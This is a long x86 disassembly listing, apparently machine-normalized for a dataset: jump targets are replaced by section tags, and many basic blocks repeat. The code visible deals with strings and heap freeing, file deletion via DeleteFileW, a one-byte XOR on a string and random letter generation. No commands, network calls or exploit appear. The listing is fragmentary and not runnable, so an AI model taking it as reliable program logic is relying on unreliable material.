je r-xdata
push eax
call ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x20 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x24 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
xor eax eax
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push ebx
call sub_10065045
add esp 0x4
lea ecx [ ecx ]
mov edx [ esp + 0x20 ]
push edx
call sub_10065045
add esp 0x4
mov ebx 0x7
mov edx [ esp + 0x20 ]
push edx
call sub_10065045
add esp 0x4
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1005c70c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1005c770
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100827dc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
cmp [ ebx + 0x8 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x330 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
lea edx [ esp + 0x9c ]
mov eax 0xc4
mov [ esp + 0x2c ] edi
mov [ esp + 0x40 ] edi
call sub_1001bb80
mov eax [ ebx + 0xa4 ]
sub eax [ ebx + 0xa0 ]
xor esi esi
sar eax 0x3
test eax eax
je r-xdata
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x30 ]
mov ecx ebx
lea esi [ esp + 0x44 ]
call sub_10038090
mov [ esp + 0x330 ] 0x3
cmp [ ebx + 0x8 ] edi
je r-xdata
mov edi edi
mov esi [ esp + 0x1c ]
xor eax eax
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ esp + 0x44 ]
lea edi [ esp + 0x20 ]
call sub_10032770
test eax eax
je r-xdata
cmp [ esp + 0xb0 ] 0x8
jb r-xdata
lea eax [ esp + 0x114 ]
lea edx [ eax + 0x2 ]
inc eax
cmp eax 0x39
jb r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_10054700
test esi esi
je r-xdata
mov eax [ esp + 0x40 ]
cmp eax 0x1e84800
jge r-xdata
mov esi [ esp + 0x1c ]
xor eax eax
mov [ esp + 0xb0 ] edi
mov [ esp + 0xac ] 0x0
mov [ esp + 0x9c ] ax
test esi esi
je r-xdata
mov edx [ esp + 0x9c ]
push edx
call sub_10065045
add esp 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x118 ]
push eax
lea ecx [ esp + 0xa4 ]
call sub_1005e3c0
mov eax [ ebx + 0xa0 ]
mov ecx [ eax + esi * 8 ]
mov [ esp + 0xb8 ] ecx
mov edx [ eax + esi * 8 + 0x4 ]
lea ecx [ esp + 0x9c ]
lea edi [ esp + 0x1c ]
mov [ esp + 0xbc ] edx
call sub_1003e740
lea ecx [ esp + 0x9c ]
lea edi [ esp + 0x30 ]
call sub_1002ba80
cmp [ esp + 0xb0 ] 0x8
jb r-xdata
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
lea edx [ esp + 0x14 ]
mov eax 0xae
call sub_1001bb80
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x12c ]
mov [ esp + 0x30 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push eax
mov eax [ esp + 0x34 ]
push eax
push ecx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov ecx [ ebx + 0xa4 ]
sub ecx [ ebx + 0xa0 ]
inc esi
sar ecx 0x3
cmp esi ecx
jb r-xdata
mov eax [ esp + 0x9c ]
push eax
call sub_10065045
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edx
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
mov eax [ esp + 0x2c ]
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x2c ]
push ecx
push edx
lea eax [ esp + 0x11c ]
call sub_1000c170
add esp 0x8
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2c ]
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_10054700
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
xor eax eax
mov edi 0x7
xor ecx ecx
mov [ esp + 0xb0 ] edi
mov [ esp + 0xac ] eax
mov [ esp + 0x9c ] cx
mov [ esp + 0xb8 ] eax
mov [ esp + 0xbc ] eax
mov [ esp + 0x330 ] 0x2
mov edx [ r--data ]
movsx eax [ edx ]
xor eax 0x3b
and eax 0xff
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x18 ] ax
mov eax edx
push eax
mov [ esp + 0x1e ] cx
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ esp + 0x12c ]
call sub_10024da0
test eax eax
jne r-xdata
xor edi edi
mov esi [ esp + 0x1c ]
cmp esi [ esp + 0x20 ]
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov esi [ esp + 0x1c ]
cmp esi [ esp + 0x20 ]
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov edx [ ebx + 0xa4 ]
mov ecx [ ebx + 0xa0 ]
cmp ecx edx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov edx [ ebx + 0xa4 ]
mov ecx [ ebx + 0xa0 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov eax 0x3
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x40 ]
push eax
push ecx
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax edx
cmp edx edx
je r-xdata
xor eax eax
lea esp [ esp ]
mov eax edx
cmp edx edx
je r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10068660
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0xa4 ] ecx
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
inc eax
cmp eax 0x14
jb r-xdata
jmp r-xdata
mov [ ebx + 0xa4 ] ecx
nop
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x3e
call sub_1001bb80
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_10054700
cmp [ esp + 0x1c ] 0x0
je r-xdata
inc eax
cmp eax 0x3b
jb r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_10054700
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov [ esp + 0x330 ] 0x1
mov eax [ esp + 0x44 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
push eax
call esi
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call esi
mov eax 0x5
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x40 ]
push eax
push ecx
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
push esi
call sub_10065045
add esp 0x4
mov ebx 0x7
cmp [ esp + 0x54 ] 0x0
je r-xdata
push eax
call esi
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
mov [ esp + 0x54 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ esp + 0x60 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ esp + 0x94 ] 0x0
je r-xdata
push eax
call esi
cmp [ esp + 0x98 ] 0x0
je r-xdata
mov [ esp + 0x94 ] 0x0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
lea esi [ esp + 0x98 ]
call sub_10017e40
mov ebx [ esp + 0x30 ]
test ebx ebx
je r-xdata
cmp esi [ esp + 0x20 ]
je r-xdata
xor eax eax
mov edi [ esp + 0x34 ]
mov esi ebx
cmp ebx edi
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
call sub_10065045
add esp 0x4
nop
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1005ceb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fbe9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x18 ]
push eax
call sub_1000b569
mov ecx [ ebp - 0x18 ]
mov eax 0x51eb851f
mul ecx
mov eax edx
shr eax 0x3
mov dl 0x19
imul dl
sub cl al
mov eax [ esi + 0x10 ]
add esp 0x4
lea ebx [ ecx + 0x41 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx 0x1
jbe r-xdata
push r--data
call sub_100616c6
lea edi [ eax + 0x1 ]
cmp edi 0xfffffffe
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d5e0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
test edi edi
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ecx [ esi + 0x10 ]
mov edx 0x10
cmp [ esi + 0x14 ] edx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] bl
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] edx
jb r-xdata
mov [ eax + edi ] 0x0
sub_1005cfc8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_1005cffa
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x18 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_1005d01e
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10017bc2
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_1005d090
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_1004d5e0
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100146b0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100146b0
pop esi
pop ebx
pop ebp
retn 0x8
sub_1005d190
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x28
je r-xdata
lea ecx [ esi + 0x24 ]
push ecx
push edi
call sub_1005fce0
add esp 0x8
cmp eax 0x29
je r-xdata
cmp eax 0x18
jne r-xdata
push esi
push edi
call sub_10030ff0
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x18 ]
push eax
push edi
call sub_10030ff0
add esp 0x8
push esi
push edi
call sub_10030ff0
add esp 0x8
pop edi
pop esi
pop ebp
retn
sub_1005d1f0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x2c ] edx
xor eax eax
push edi
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
nop
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xe
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xf
jb r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
mov edi [ edx + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi [ edx + 0xc ]
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_10078600
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] 0x0
mov edi [ edx + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x8 ] eax
call sub_10078600
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x8 ] 0x0
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x18 ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x20 ]
pop edi
pop esi
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0xc ] eax
call sub_10078600
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov [ ebx + 0x20 ] eax
inc [ eax + 0x1c ]
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x1c ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x1c ] 0x0
sub_1005d387
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1005d3a9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_1005d45e
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1005d4a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fcb1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
push eax
push edi
push esi
call sub_10077d10
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
sub_1005d560
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x78
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1001c310
mov eax esi
mov esp ebp
pop ebp
retn
sub_1005d58c
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_10044fed
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10078ac0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
